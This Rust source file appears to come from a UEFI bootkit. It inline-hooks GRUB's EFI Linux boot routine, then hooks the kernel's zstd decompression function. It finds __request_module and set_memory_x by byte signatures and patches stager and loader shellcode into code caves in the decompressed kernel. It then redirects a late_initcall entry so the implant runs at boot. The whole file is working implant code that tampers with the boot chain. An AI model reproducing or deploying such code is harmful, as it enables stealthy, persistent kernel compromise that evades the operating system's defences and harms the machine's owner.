use log::{debug, error, info};

use crate::helpers::{
    file_helper::cave_finder_by_section_name,
    memory_helper::{
        INLINE_HOOK_SIZE, InitcallPhase, InlineHook, ZSTD_DECOMPRESS_FUNC_SIGNATURE, binary_search,
        get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
        translate_physical_to_virtual,
    },
};

pub static mut GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE: InlineHook = InlineHook {
    target: 0,
    hook: 0,
    original_bytes: [0; INLINE_HOOK_SIZE],
};

pub static mut ZSTD_DECOMPRESS_DCTX_HOOK_INLINE: InlineHook = InlineHook {
    target: 0,
    hook: 0,
    original_bytes: [0; INLINE_HOOK_SIZE],
};

const REQUEST_MODULE_PATTERN: &[u8] = &[0x65, 0x48, 0x8B, 0x05, 0xAB, 0x95];
const REQUEST_MODULE_DISTANCE: u8 = 0x45;
const SET_MEMORY_X_PATTERN: &[u8] = &[0x31, 0xC0, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x08];
const SET_MEMORY_X_DISTANCE: u8 = 6;
const REQUEST_MODULE_SENTINEL: u64 = 0xDEADBEEFDEADBEEF;
const ORIGINAL_FN_SENTINEL: u64 = 0xCAFEBABECAFEBABE;
const CAVE_PAGE_SENTINEL: u64 = 0xBADC0FFEE0DDF00D;
const SET_MEMORY_X_SENTINEL: u64 = 0xFACEFEEDFACEFEED;
const LOADER_VIRT_SENTINEL: u64 = 0xDEADFACEDEADFACE;

/// grub_arch_efi_linux_boot_image_hook is an inline hook for the GRUB function responsible for loading Linux boot images on EFI systems.
/// It restores the original function before executing it to ensure stability, and hooking the Linux kernel.
///
/// # Arguments
/// - `kernel_entry`: The entry point of the Linux kernel.
/// - `kernel_size`: The size of the Linux kernel.
/// - `args`: Additional arguments passed to the original function.
///
/// # Returns
/// - `i32`: The return value from the original function, or -1 if an error occurs.
pub extern "C" fn grub_arch_efi_linux_boot_image_hook(
    kernel_entry: usize,
    kernel_size: usize,
    args: *const u8,
) -> i32 {
    let original_fn_addr: usize;
    let real_kernel_entry: usize;
    unsafe {
        core::arch::asm!(
            "mov {}, rax",
            out(reg) original_fn_addr,
            options(nomem, nostack, preserves_flags)
        );
        core::arch::asm!(
            "mov {}, r12",
            out(reg) real_kernel_entry,
            options(nomem, nostack, preserves_flags)
        );
    }

    debug!(
        "grub_arch_efi_linux_boot_image_hook called with kernel_entry: {:#x}, kernel_size: {:#x}, args: {:#x}",
        real_kernel_entry, kernel_size, args as usize
    );

    // Snapshot hook state once so restore/jump use the same values.
    let mut target = unsafe {
        core::ptr::addr_of!(GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE.target).read_volatile()
    };
    let original_bytes = unsafe {
        core::ptr::addr_of!(GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE.original_bytes)
            .read_volatile()
    };

    if target == 0 {
        error!("Hook target was not initialized");
        return -1;
    }

    if original_fn_addr == 0 {
        error!("Original function address was not preserved");
        return -1;
    }

    if let Err(e) = restore_inline_hook(target, &original_bytes) {
        error!("Failed to restore original function: {:?}", e);
        return -1;
    }

    let original_fn: extern "C" fn(usize, usize, *const u8) -> i32 =
        unsafe { core::mem::transmute(original_fn_addr) };

    // Finding zstd_decompress_dctx in vmlinuz.
    target = match binary_search(
        real_kernel_entry as usize,
        kernel_size as usize,
        ZSTD_DECOMPRESS_FUNC_SIGNATURE,
    ) {
        Some(addr) => addr,
        None => {
            error!("Failed to find target function in original GRUB");

            return original_fn(kernel_entry, kernel_size, args);
        }
    };

    if target == 0 {
        error!("Failed to find target function in original GRUB");

        return original_fn(kernel_entry, kernel_size, args);
    }
    debug!("Found target function at address: {:#x}", target);

    // Hooking vmlinuz's decompression functions.
    let vmlinuz_hook = zstd_decompress_dctx_hook as *const () as usize;
    let hook_info = match inline_jump_hook(target, vmlinuz_hook) {
        Ok(info) => info,
        Err(e) => {
            error!("Failed to install inline hook, reason {:?}", e);

            return original_fn(kernel_entry, kernel_size, args);
        }
    };
    unsafe {
        ZSTD_DECOMPRESS_DCTX_HOOK_INLINE = hook_info;
    }
    debug!(
        "Installed zstd_decompress_dctx_hook at address: {:#x}",
        vmlinuz_hook
    );

    // Call the original callee that was held in rax at the patched call site.
    original_fn(kernel_entry, kernel_size, args)
}

/// zstd_decompress_dctx_hook is an inline hook for the zstd_decompress_dctx function in the Linux kernel.
///
/// # Arguments:
/// - `dctx`: The decompression context.
/// - `dst`: The destination buffer for the decompressed data.
/// - `dst_capacity`: The capacity of the destination buffer.
/// - `src`: The source buffer containing the compressed data.
/// - `src_size`: The size of the source buffer.
///
/// # Returns:
/// - `isize`: The return value from the original function, or -1 if an error occurs.
pub extern "sysv64" fn zstd_decompress_dctx_hook(
    dctx: usize,
    dst: usize,
    dst_capacity: usize,
    src: usize,
    src_size: usize,
) -> isize {
    debug!(
        "zstd_decompress_dctx_hook called with dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
        dctx, dst, dst_capacity, src, src_size
    );

    let target =
        unsafe { core::ptr::addr_of!(ZSTD_DECOMPRESS_DCTX_HOOK_INLINE.target).read_volatile() };
    let original_bytes = unsafe {
        core::ptr::addr_of!(ZSTD_DECOMPRESS_DCTX_HOOK_INLINE.original_bytes).read_volatile()
    };
    if target == 0 {
        error!("Hook target was not initialized");

        return -1;
    }
    if let Err(e) = restore_inline_hook(target, &original_bytes) {
        error!("Failed to restore original function: {:?}", e);
        return -1;
    }
    let original_fn: extern "sysv64" fn(usize, usize, usize, usize, usize) -> isize =
        unsafe { core::mem::transmute(target) };
    let ret_val = original_fn(dctx, dst, dst_capacity, src, src_size);

    debug!(
        "zstd_decompress_dctx state is now: dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
        dctx, dst, dst_capacity, src, src_size
    );
    info!(
        "Decompressed linux kernel is at address: {:#x}, size: {:#x}",
        dst, dst_capacity
    );

    // Deploy the kernel hook: overwrite the late_initcall slot to point at our
    // shellcode in the code cave, which calls __request_module then tail-calls
    // the original initcall target.
    let initcall_info =
        match get_initcall_phase_address(dst, dst_capacity, InitcallPhase::LateInitcall) {
            Some(info) => info,
            None => {
                error!("Failed to find late_initcall address in kernel");
                return ret_val;
            }
        };
    debug!(
        "Found late_initcall entry: entry_phys={:#x}, entry_virt={:#x}, original_target_virt={:#x}",
        initcall_info.entry_physical_address,
        initcall_info.entry_virtual_address,
        initcall_info.original_target_virtual_address
    );

    // Stage 1 — stager (41 bytes) lives in .text (always RX).
    // Stage 2 — loader lives in .data (initially RW; stager calls set_memory_x first).
    const STAGER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_STAGER_BIN"));
    const STAGER_LEN: usize = STAGER_TEMPLATE.len();
    const LOADER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_LOADER_BIN"));
    const LOADER_LEN: usize = LOADER_TEMPLATE.len();

    // Find stager cave in .text (STAGER_LEN + 15 bytes for 16-byte alignment headroom).
    let stager_cave = match cave_finder_by_section_name(dst, dst_capacity, STAGER_LEN, ".text") {
        Some(addr) => addr,
        None => {
            error!("Failed to find stager cave in .text");
            return ret_val;
        }
    };
    // let stager_cave = (stager_cave + 15) & !15;
    // debug!("Stager cave: phys={:#x} (aligned)", stager_cave);
    debug!("Stager cave: phys={:#x}", stager_cave);

    // Find loader cave in .data (LOADER_LEN + 15 bytes for alignment headroom).
    let loader_cave = match cave_finder_by_section_name(dst, dst_capacity, LOADER_LEN, ".data") {
        Some(addr) => addr,
        None => {
            error!("Failed to find loader cave in .data");
            return ret_val;
        }
    };
    // let loader_cave = (loader_cave + 15) & !15;
    debug!("Loader cave: phys={:#x}", loader_cave);

    // Find __request_module via byte pattern.
    let mut request_module_phys = match binary_search(dst, dst_capacity, REQUEST_MODULE_PATTERN) {
        Some(addr) => addr,
        None => {
            error!("Failed to find __request_module in kernel");
            return ret_val;
        }
    };
    request_module_phys -= REQUEST_MODULE_DISTANCE as usize;
    let request_module_virt =
        match translate_physical_to_virtual(dst, dst_capacity, request_module_phys) {
            Some(addr) => addr,
            None => {
                error!("Failed to translate __request_module to virtual address");
                return ret_val;
            }
        };
    debug!(
        "__request_module: phys={:#x}, virt={:#x}",
        request_module_phys, request_module_virt
    );

    // Find set_memory_x via __ksymtab.
    let mut set_memory_x_phys = match binary_search(dst, dst_capacity, SET_MEMORY_X_PATTERN) {
        Some(addr) => addr,
        None => {
            error!("Failed to find set_memory_x");
            return ret_val;
        }
    };
    set_memory_x_phys -= SET_MEMORY_X_DISTANCE as usize;
    let set_memory_x_virt = match translate_physical_to_virtual(dst, dst_capacity, set_memory_x_phys) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate set_memory_x to virtual address");
            return ret_val;
        }
    };
    debug!(
        "set_memory_x: phys={:#x}, virt={:#x}",
        set_memory_x_phys, set_memory_x_virt
    );

    let stager_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, stager_cave) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate stager cave to virtual address");
            return ret_val;
        }
    };
    debug!(
        "Stager cave: phys={:#x}, virt={:#x}",
        stager_cave, stager_cave_virt
    );

    let loader_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, loader_cave) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate loader cave to virtual address");
            return ret_val;
        }
    };
    debug!(
        "Loader cave: phys={:#x}, virt={:#x}",
        loader_cave, loader_cave_virt
    );

    // Page-aligned virt addr passed as arg1 to set_memory_x(addr, nrpages=1).
    let loader_cave_page_virt: u64 = (loader_cave_virt & !0xFFF) as u64;
    debug!(
        "Loader cave page (for set_memory_x): {:#x}",
        loader_cave_page_virt
    );

    // ── Patch stager blob ──────────────────────────────────────────────────────
    let mut stager = [0u8; STAGER_LEN];
    stager.copy_from_slice(STAGER_TEMPLATE);

    let sentinel = CAVE_PAGE_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel(&stager, &sentinel) {
        stager[off..off + 8].copy_from_slice(&loader_cave_page_virt.to_le_bytes());
    } else {
        error!("Failed to find CAVE_PAGE_SENTINEL in stager");
        return ret_val;
    }

    let sentinel = SET_MEMORY_X_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel(&stager, &sentinel) {
        stager[off..off + 8].copy_from_slice(&(set_memory_x_virt as u64).to_le_bytes());
    } else {
        error!("Failed to find SET_MEMORY_X_SENTINEL in stager");
        return ret_val;
    }

    let sentinel = LOADER_VIRT_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel(&stager, &sentinel) {
        stager[off..off + 8].copy_from_slice(&(loader_cave_virt as u64).to_le_bytes());
    } else {
        error!("Failed to find LOADER_VIRT_SENTINEL in stager");
        return ret_val;
    }

    // ── Patch loader blob ──────────────────────────────────────────────────────
    let mut loader = [0u8; LOADER_LEN];
    loader.copy_from_slice(LOADER_TEMPLATE);

    let sentinel = REQUEST_MODULE_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel(&loader, &sentinel) {
        loader[off..off + 8].copy_from_slice(&(request_module_virt as u64).to_le_bytes());
    } else {
        error!("Failed to find REQUEST_MODULE_SENTINEL in loader");
        return ret_val;
    }

    let sentinel = ORIGINAL_FN_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel(&loader, &sentinel) {
        loader[off..off + 8]
            .copy_from_slice(&(initcall_info.original_target_virtual_address as u64).to_le_bytes());
    } else {
        error!("Failed to find ORIGINAL_FN_SENTINEL in loader");
        return ret_val;
    }

    // ── Write both blobs ───────────────────────────────────────────────────────
    unsafe {
        core::ptr::copy_nonoverlapping(stager.as_ptr(), stager_cave as *mut u8, STAGER_LEN);
        core::ptr::copy_nonoverlapping(loader.as_ptr(), loader_cave as *mut u8, LOADER_LEN);
    }
    debug!(
        "Wrote {} bytes of stager to {:#x}, {} bytes of loader to {:#x}",
        STAGER_LEN, stager_cave, LOADER_LEN, loader_cave
    );

    // ── Patch initcall slot (prel32) to point at the stager ────────────────────
    let relative_offset = (stager_cave_virt as i64) - (initcall_info.entry_virtual_address as i64);
    if relative_offset < i32::MIN as i64 || relative_offset > i32::MAX as i64 {
        error!(
            "Stager cave too far from initcall entry for prel32: delta={:#x}",
            relative_offset
        );
        return ret_val;
    }
    unsafe {
        core::ptr::write(
            initcall_info.entry_physical_address as *mut i32,
            relative_offset as i32,
        );
    }
    info!(
        "Patched late_initcall entry at virt={:#x} (phys={:#x}) prel32={} -> stager at virt={:#x}",
        initcall_info.entry_virtual_address,
        initcall_info.entry_physical_address,
        relative_offset as i32,
        stager_cave_virt
    );

    ret_val
}

/// Finds the byte offset of an 8-byte sentinel value within a buffer.
fn find_sentinel(buf: &[u8], sentinel: &[u8; 8]) -> Option<usize> {
    buf.windows(8).position(|w| w == sentinel)
}
